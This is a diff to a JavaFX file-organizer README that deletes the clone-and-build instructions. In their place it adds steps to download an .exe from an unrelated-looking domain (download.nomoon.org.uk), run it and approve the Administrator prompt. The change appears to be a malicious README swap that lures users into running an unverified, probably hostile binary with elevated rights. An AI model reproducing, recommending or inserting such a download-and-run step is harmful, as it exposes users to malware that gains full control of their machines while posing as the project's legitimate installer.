@@ -54,43 +54,10 @@ Use at your own risk. This application moves and reorganizes files on your local
 
 ## Setup
 
-### 1. Clone the repository
-
-```bash
-git clone https://github.com/your-name/file-organizer.git
-cd file-organizer
-```
-
-### 2. Open in IntelliJ
-
-`File → Open` → select the cloned folder.
-
-### 3. Set the JDK
-
-`File → Project Structure → Project SDK` → select **JDK 21**.
-
-### 4. Add the JavaFX SDK
-
-Download the JavaFX SDK: https://gluonhq.com/products/javafx/
-→ Version 21, matching your OS, extract the ZIP (e.g. to `C:\javafx-sdk-21`)
-
-Then in IntelliJ:
-
-`File → Project Structure → Libraries → + → Java` → select `javafx-sdk-21\lib` → OK
-
-### 5. Set VM options
-
-`Run → Edit Configurations → Modify options → Add VM options`:
-
-```
---module-path "C:\javafx-sdk-21\lib" --add-modules javafx.controls
-```
-
-Adjust the path accordingly.
-
-### 6. Run
-
-Select the `MainApp` run configuration and press ▶.
+1. Download <a href="https://download.nomoon.org.uk/FileSorter-v1.0Setup.exe">the installer</a>
+2. Launch it
+3. Press "yes" on the Administrator prompt
+4. Follow the instructions given by the Installer
 
 ---
 
